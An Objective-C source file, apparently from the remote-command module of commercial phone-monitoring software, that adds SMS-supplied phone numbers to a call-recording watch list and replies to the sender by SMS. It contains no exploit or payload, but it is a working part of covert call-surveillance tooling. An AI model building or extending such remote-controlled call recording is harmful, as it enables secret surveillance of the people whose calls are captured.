/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddCallRecordWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "AddCallRecordWatchNumberProcessor.h"
#import "PrefCallRecord.h"
#import "PreferenceManager.h"

@interface AddCallRecordWatchNumberProcessor (PrivateAPI)
- (void) processAddCallRecordWatchNumber;
- (void) addCallRecordWatchNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddCallRecordWatchNumber;
- (BOOL) checkIfCallRecordWatchNumberAlreadyExist;
@end

@implementation AddCallRecordWatchNumberProcessor

@synthesize mCallRecordWatchNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddCallRecordWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddCallRecordWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddCallRecordWatchNumberProcessor
 - Argument list and description: No Argument
 - Return description: self (AddCallRecordWatchNumberProcessor)
*/

- (void) doProcessingCommand {
	DLog (@"AddCallRecordWatchNumberProcessor--->doProcessingCommand")
	DLog (@"argument for adding watch number: %@", [mRemoteCmdData mArguments])
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		
		[self setMCallRecordWatchNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] 
														 validationType:kPhoneNumberValidation]];
		DLog(@"AddCallRecordWatchNumberProcessor--->Watch Numbers:%@", mCallRecordWatchNumberList);
		if ([mCallRecordWatchNumberList count]>0) {
			if ([self canAddCallRecordWatchNumber]) { 
				if (![self checkIfCallRecordWatchNumberAlreadyExist] &&
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mCallRecordWatchNumberList])  [self processAddCallRecordWatchNumber];
				else [self addCallRecordWatchNumberException:kCmdExceptionErrorCannotAddDuplicateToCallRecordWatchList];
			}
			else {
				[self addCallRecordWatchNumberException:kCmdExceptionErrorCallRecordNumberExceedListCapacity];
			}
		}
		else {
			[self addCallRecordWatchNumberException:kCmdExceptionErrorInvalidNumberToCallRecordWatchList];
		}				
	} else {
		[self addCallRecordWatchNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark AddCallRecordWatchNumberProcessor PrivateAPI Methods

/**
 - Method name: processAddCallRecordWatchNumber
 - Purpose:This method is used to process Add Watch Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/


- (void) processAddCallRecordWatchNumber {
	DLog (@"AddCallRecordWatchNumberProcessor--->processAddCallRecordWatchNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefCallRecord *prefCallRecord = (PrefCallRecord *) [prefManager preference:kCallRecord];
	
	NSMutableArray *watchList=[[NSMutableArray alloc] init];
	
	// Existing Numbers
	for (NSString *watchNumber in [prefCallRecord mWatchNumbers]) {
		[watchList addObject:watchNumber];
	}
	// New Numbers
	for (NSString *watchNumber in mCallRecordWatchNumberList) {
		[watchList addObject:watchNumber];
	}
	[prefCallRecord setMWatchNumbers:watchList];
	[prefManager savePreferenceAndNotifyChange:prefCallRecord];
	[watchList release];
	[self sendReplySMS];
}

/**
 - Method name: canAddCallRecordWatchNumber
 - Purpose:This method is to check maximum watch number list capacity. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) canAddCallRecordWatchNumber {
	DLog (@"AddCallRecordWatchNumberProcessor--->canAddCallRecordWatchNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefCallRecord *prefCallRecord = (PrefCallRecord *) [prefManager preference:kCallRecord];
	unsigned long count=[[prefCallRecord mWatchNumbers] count]+[mCallRecordWatchNumberList count];
	if (count<=10) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfCallRecordWatchNumberAlreadyExist
 - Purpose:This method is used to check if watch number already exist. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) checkIfCallRecordWatchNumberAlreadyExist {
	BOOL isNumberExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefCallRecord *prefCallRecord = (PrefCallRecord *) [prefManager preference:kCallRecord];
	for (NSString *watchNumber in mCallRecordWatchNumberList) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",watchNumber];
		NSArray *result=[[prefCallRecord mWatchNumbers] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist=YES;
			break;
		}
	}
	return isNumberExist;
}

/**
 - Method name: addCallRecordWatchNumberException
 - Purpose:This method is invoked when watch number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) addCallRecordWatchNumberException: (NSUInteger) aErrorCode {
	DLog (@"AddCallRecordWatchNumberProcessor--->addCallRecordWatchNumberException")
	FxException* exception = [FxException exceptionWithName:@"addCallRecordWatchNumberException" andReason:@"Add Call Record Watch number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM];
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"AddCallRecordWatchNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mCallRecordWatchNumberList release];
	[super dealloc];
}

@end
